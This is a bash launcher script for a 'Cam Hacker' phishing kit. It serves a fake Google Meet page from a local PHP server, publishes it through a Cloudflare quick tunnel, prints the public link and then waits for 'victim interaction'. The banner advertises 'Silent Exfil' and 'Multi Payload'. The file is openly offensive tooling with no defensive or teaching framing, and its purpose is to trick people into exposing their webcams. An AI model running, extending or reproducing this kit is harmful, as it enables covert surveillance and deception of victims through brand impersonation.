#!/bin/bash

# Cam Hacker - Phase 2 Launcher (Cloudflare Tunnel + Silent Exfil)

SITE_DIR="sites/google_meet_cam"
SERVER_DIR=".server/www"
PORT=8080

# Colors
RED="\033[1;31m"
GREEN="\033[1;32m"
CYAN="\033[1;36m"
RESET="\033[0m"

function banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║       Cam Hacker - Multi Payload      ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
}

function start_php_server() {
    mkdir -p $SERVER_DIR
    cp -r $SITE_DIR/* $SERVER_DIR/
    cd $SERVER_DIR && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    echo -e "${GREEN}[+] PHP server started at http://127.0.0.1:$PORT${RESET}"
}

function start_cloudflared() {
    echo -e "${GREEN}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel -url http://127.0.0.1:$PORT > ../cloudflared.log 2>&1 &
    sleep 6
    URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ../cloudflared.log | head -n 1)
    if [[ $URL ]]; then
        echo -e "${GREEN}[+] Public URL: $URL${RESET}"
    else
        echo -e "${RED}[!] Failed to get Cloudflared URL. Make sure it's installed.${RESET}"
        exit 1
    fi
    echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
}

# Execution starts here
banner

echo -e "${CYAN}[1] Launch Google Meet Cam Hacker${RESET}"
read -p $'Choose an option: ' opt

if [[ $opt == 1 ]]; then
    start_php_server
    start_cloudflared
else
    echo -e "${RED}[!] Invalid option${RESET}"
fi
